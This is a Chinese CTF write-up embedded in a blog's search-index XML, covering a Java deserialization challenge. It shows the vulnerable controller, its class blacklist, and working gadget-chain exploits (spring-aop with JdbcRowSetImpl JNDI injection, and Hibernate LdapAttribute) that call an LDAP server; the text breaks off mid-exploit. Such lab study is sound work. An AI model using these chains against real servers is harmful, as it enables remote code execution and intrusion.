<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ccsssc复赛</title>
      <link href="/2025/04/21/ccsssc-fu-sai/index/"/>
      <url>/2025/04/21/ccsssc-fu-sai/index/</url>
      
        <content type="html"><![CDATA[<p>一场很幽默的比赛.但是其中的java题不错,还是值得复现一下的.<br>版本为java11.<br><img src="/picture_store/Pasted%20image%2020250404151146.png"><br><code>backdoor.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.ezjav.controller;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.ezjav.utils.MyObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">backdoor</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">String</span> <span class="variable">banner</span> <span class="operator">=</span> <span class="string">&quot;Welcome to java&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> banner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/read&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">read</span><span class="params">(<span class="meta">@RequestBody</span> String body)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (body != <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">byte</span>[] data = Base64.getDecoder().decode(body);</span><br><span class="line">                <span class="type">String</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(data);</span><br><span class="line">                <span class="keyword">if</span> (temp.contains(<span class="string">&quot;naming&quot;</span>) || temp.contains(<span class="string">&quot;com.sun&quot;</span>) || temp.contains(<span class="string">&quot;jdk.jfr&quot;</span>))</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;banned&quot;</span>;</span><br><span class="line">                <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(data);</span><br><span class="line">                <span class="type">MyObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">                <span class="keyword">return</span> object.getClass().toString();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">return</span> e.toString();</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>PalDataSource.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.ezjav.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.druid.pool.DruidDataSource;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PalDataSource</span> <span class="keyword">extends</span> <span class="title class_">DruidDataSource</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Connection <span class="title function_">getConnection</span><span class="params">(String username, String password)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.getConnection(username, password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>User.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.ezjav.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>, Comparator &#123;</span><br><span class="line">    <span class="keyword">public</span> String username;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String password;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object compare;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String user, String pass, String cmp)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = user;</span><br><span class="line">        <span class="built_in">this</span>.password = pass;</span><br><span class="line">        <span class="built_in">this</span>.compare = cmp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Object o1, Object o2)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> <span class="built_in">this</span>.compare.getClass().getDeclaredMethod(<span class="string">&quot;compare&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class, Object.class &#125;);</span><br><span class="line">            m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            m.invoke(<span class="built_in">this</span>.compare, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; o1, o2 &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>MyObjectInputStream</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.ezjav.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InvalidClassException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectStreamClass;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String[] denyClasses;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyObjectInputStream</span><span class="params">(ByteArrayInputStream var1)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>(var1);</span><br><span class="line">        ArrayList&lt;String&gt; classList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">file</span> <span class="operator">=</span> com.example.ezjav.utils.MyObjectInputStream.class.getResourceAsStream(<span class="string">&quot;blacklist.txt&quot;</span>);</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(file));</span><br><span class="line">        String var4;</span><br><span class="line">        <span class="keyword">while</span> ((var4 = var2.readLine()) != <span class="literal">null</span>)</span><br><span class="line">            classList.add(var4.trim());</span><br><span class="line">        <span class="built_in">this</span>.denyClasses = <span class="keyword">new</span> <span class="title class_">String</span>[classList.size()];</span><br><span class="line">        classList.toArray(<span class="built_in">this</span>.denyClasses);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> desc.getName();</span><br><span class="line">        <span class="type">int</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="built_in">this</span>.denyClasses.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="number">0</span>; var6 &lt; var5; var6++) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">denyClass</span> <span class="operator">=</span> <span class="built_in">this</span>.denyClasses[var6];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(denyClass))</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Unauthorized deserialization attempt&quot;</span>, className);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后来看一下黑名单<code>blacklist.txt</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">javax.management.BadAttributeValueExpException</span><br><span class="line">com.sun.org.apache.xpath.internal.objects.XString</span><br><span class="line">java.rmi.MarshalledObject</span><br><span class="line">java.rmi.activation.ActivationID</span><br><span class="line">javax.swing.event.EventListenerList</span><br><span class="line">java.rmi.server.RemoteObject</span><br><span class="line">javax.swing.AbstractAction</span><br><span class="line">javax.swing.text.DefaultFormatter</span><br><span class="line">java.beans.EventHandler</span><br><span class="line">java.net.Inet4Address</span><br><span class="line">java.net.Inet6Address</span><br><span class="line">java.net.InetAddress</span><br><span class="line">java.net.InetSocketAddress</span><br><span class="line">java.net.Socket</span><br><span class="line">java.net.URL</span><br><span class="line">java.net.URLStreamHandler</span><br><span class="line">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><br><span class="line">java.rmi.registry.Registry</span><br><span class="line">java.rmi.RemoteObjectInvocationHandler</span><br><span class="line">java.rmi.server.ObjID</span><br><span class="line">java.lang.System</span><br><span class="line">javax.management.remote.JMXServiceUR</span><br><span class="line">javax.management.remote.rmi.RMIConnector</span><br><span class="line">java.rmi.server.RemoteObject</span><br><span class="line">java.rmi.server.RemoteRef</span><br><span class="line">javax.swing.UIDefaults$TextAndMnemonicHashMap</span><br><span class="line">java.rmi.server.UnicastRemoteObject</span><br><span class="line">java.util.Base64</span><br><span class="line">java.util.Comparator</span><br><span class="line">java.util.HashMap</span><br><span class="line">java.util.logging.FileHandler</span><br><span class="line">java.security.SignedObject</span><br><span class="line">javax.swing.UIDefaults</span><br></pre></td></tr></table></figure><p>那么在看到这几个类,不考虑黑名单和依赖的情况下,首先关注到的就是在<code>User</code>类下的<code>Compare</code>方法.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Object o1, Object o2)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> <span class="built_in">this</span>.compare.getClass().getDeclaredMethod(<span class="string">&quot;compare&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class, Object.class &#125;);</span><br><span class="line">            m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            m.invoke(<span class="built_in">this</span>.compare, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; o1, o2 &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然而仔细看了一下发现了问题,User类中的compare方法要求是String类型,并不是真正的可控.<br>然而这里给了我们启示,看到依赖中存在<code>spring-aop</code>和<code>aspectjweaver</code>,想到了新出的链子.对于直接解码进行的检测,可以直接使用<code>UTF8OverlongEncoding</code>去进行绕过.<br>对于除了<code>equals,hashcode</code>这两种方法,其他的都能触发<code>getAProxy</code>,打完整个利用链.<br>然而我们在尝试利用链的时候出现了报错:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> java.lang.IllegalArgumentException: Can not set <span class="keyword">final</span> java.util.Comparator field java.util.PriorityQueue.comparator to com.sun.proxy.$Proxy1</span><br><span class="line">at java.base/jdk.internal.reflect.UnsafeFieldAccessorImpl.throwSetIllegalArgumentException(UnsafeFieldAccessorImpl.java:<span class="number">167</span>)</span><br><span class="line">at java.base/jdk.internal.reflect.UnsafeFieldAccessorImpl.throwSetIllegalArgumentException(UnsafeFieldAccessorImpl.java:<span class="number">171</span>)</span><br><span class="line">at java.base/jdk.internal.reflect.UnsafeQualifiedObjectFieldAccessorImpl.set(UnsafeQualifiedObjectFieldAccessorImpl.java:<span class="number">83</span>)</span><br><span class="line">at java.base/java.lang.reflect.Field.set(Field.java:<span class="number">780</span>)</span><br><span class="line">at ReflectUtil.setFieldValue(ReflectUtil.java:<span class="number">33</span>)</span><br><span class="line">at ReflectUtil.setFieldValue(ReflectUtil.java:<span class="number">25</span>)</span><br><span class="line">at Main.main(Main.java:<span class="number">26</span>)</span><br></pre></td></tr></table></figure><p>意思是不能将proxy1赋值给一个<code>Comparator</code>对象,那么我们就需要去给他套一个<code>Comparator</code>接口.<br>TemplatesImpl被禁用了,这里我们选择<code>JdbcRowSetImpl</code>来打一个jndi注入.得到payload如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">import</span> org.aopalliance.aop.Advice;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.AspectJAroundAdvice;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.AspectJExpressionPointcut;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.SingletonAspectInstanceFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        jdbcRowSet.setDataSourceName(<span class="string">&quot;ldap://127.0.0.1:50389/8cb29d&quot;</span>);</span><br><span class="line">        Method method=jdbcRowSet.getClass().getMethod(<span class="string">&quot;getDatabaseMetaData&quot;</span>);</span><br><span class="line">        <span class="type">SingletonAspectInstanceFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SingletonAspectInstanceFactory</span>(jdbcRowSet);</span><br><span class="line">        <span class="type">AspectJAroundAdvice</span> <span class="variable">advice</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AspectJAroundAdvice</span>(method,<span class="keyword">new</span> <span class="title class_">AspectJExpressionPointcut</span>(),factory);</span><br><span class="line">        <span class="type">Proxy</span> <span class="variable">proxy1</span> <span class="operator">=</span> (Proxy) ProxyUtil.getAProxy(advice,Advice.class);</span><br><span class="line">        Proxy finalproxy=(Proxy) ProxyUtil.getBProxy(proxy1,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Comparator.class&#125;);</span><br><span class="line">        PriorityQueue PQ=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">1</span>);</span><br><span class="line">        PQ.add(<span class="number">1</span>);</span><br><span class="line">        PQ.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        ReflectUtil.setFieldValue(PQ,<span class="string">&quot;comparator&quot;</span>,finalproxy);</span><br><span class="line">        ReflectUtil.setFieldValue(PQ,<span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;proxy1,proxy1&#125;);</span><br><span class="line">        System.out.println(SerializeUtil.serializeBypass(PQ));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么接下来就是注谁的问题,看了一下<code>Jackson</code>的版本,还是能打,可以考虑直接打Jackson链,本地成功的执行了命令.<br>看到了一位师傅的blog:<a href="https://gsbp0.github.io/post/%E8%BD%AF%E4%BB%B6%E6%94%BB%E9%98%B2%E8%B5%9B%E7%8E%B0%E5%9C%BA%E8%B5%9B%E4%B8%8A%E5%AF%B9justdeserialize%E6%94%BB%E5%87%BB%E7%9A%84%E5%87%A0%E6%AC%A1%E5%B0%9D%E8%AF%95/">软件系统安全赛</a>,说是可以打一个druid+hsql二次反序列化.hsql有好多二次反序列化的打法,都是在jndi注入的时候打的,这里我没研究过,索性挨个试.<br>直接使用java-chains去生成payload<br><img src="/picture_store/Pasted%20image%2020250402195012.png"><br>也是成功的执行命令了.</p><p>后记(来自上面师傅的博客):<br><img src="/picture_store/Pasted%20image%2020250402195708.png"></p><p>补档:学了Hibernate反序列化之后,发现这题也可以直接用Hibernate反序列化去打一个LdapAttribute注入,下面是构造的exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.hibernate.engine.spi.TypedValue;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.property.access.spi.Getter;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.property.access.spi.GetterMethodImpl;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.tuple.component.AbstractComponentTuplizer;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.tuple.component.PojoComponentTuplizer;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.type.ComponentType;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.CompositeName;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hibernate1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * org.hibernate.property.access.spi.GetterMethodImpl.get()</span></span><br><span class="line"><span class="comment">     * org.hibernate.tuple.component.AbstractComponentTuplizer.getPropertyValue()</span></span><br><span class="line"><span class="comment">     * org.hibernate.type.ComponentType.getPropertyValue(C)</span></span><br><span class="line"><span class="comment">     * org.hibernate.type.ComponentType.getHashCode()</span></span><br><span class="line"><span class="comment">     * org.hibernate.engine.spi.TypedValue$1.initialize()</span></span><br><span class="line"><span class="comment">     * org.hibernate.engine.spi.TypedValue$1.initialize()</span></span><br><span class="line"><span class="comment">     * org.hibernate.internal.util.ValueHolder.getValue()</span></span><br><span class="line"><span class="comment">     * org.hibernate.engine.spi.TypedValue.hashCode()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">ldapCtxUrl</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:50389/&quot;</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">ldapAttributeClazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.jndi.ldap.LdapAttribute&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">basicAttributeClazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.naming.directory.BasicAttribute&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ldapAttribute</span> <span class="operator">=</span> ReflectUtil.newInstance(ldapAttributeClazz, basicAttributeClazz, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;name&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        ReflectUtil.setFieldValue(ldapAttribute,<span class="string">&quot;baseCtxURL&quot;</span>,ldapCtxUrl);</span><br><span class="line">        ReflectUtil.setFieldValue(ldapAttribute,<span class="string">&quot;rdn&quot;</span>,<span class="keyword">new</span> <span class="title class_">CompositeName</span>(<span class="string">&quot;55f375/&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">ComponentType</span> <span class="variable">componentType</span> <span class="operator">=</span> (ComponentType) ReflectUtil.newInstance(ComponentType.class,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        ReflectUtil.setFieldValue(componentType,<span class="string">&quot;propertySpan&quot;</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TypedValue</span> <span class="variable">typedValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TypedValue</span>(componentType, ldapAttribute);</span><br><span class="line"></span><br><span class="line">        <span class="type">PojoComponentTuplizer</span> <span class="variable">pojoComponentTuplizer</span> <span class="operator">=</span> (PojoComponentTuplizer) ReflectUtil.newInstance(PojoComponentTuplizer.class,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        ReflectUtil.setFieldValue(AbstractComponentTuplizer.class,pojoComponentTuplizer,<span class="string">&quot;getters&quot;</span>,<span class="keyword">new</span> <span class="title class_">Getter</span>[]&#123;<span class="keyword">new</span> <span class="title class_">GetterMethodImpl</span>(Object.class,<span class="string">&quot;qwq&quot;</span>, ldapAttributeClazz.getDeclaredMethod(<span class="string">&quot;getAttributeDefinition&quot;</span>))&#125;);</span><br><span class="line">        ReflectUtil.setFieldValue(componentType,<span class="string">&quot;componentTuplizer&quot;</span>,pojoComponentTuplizer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashTable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        